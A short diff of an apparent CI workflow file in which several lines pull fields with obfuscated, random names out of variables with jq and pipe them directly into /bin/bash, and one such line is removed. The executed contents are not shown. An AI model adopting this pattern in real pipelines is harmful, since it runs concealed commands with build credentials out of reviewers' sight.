@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$fk392" | jq -r .ebv21380 | /bin/bash
           echo $vf8 | jq -r .gho782 | /bin/bash
           printf '%s' "$oe212" | jq -r .g0063 | /bin/bash
-          printf '%s' "$fxcg64" | jq -r .sahme433 | /bin/bash
 
       - name: Save results
         if: always()
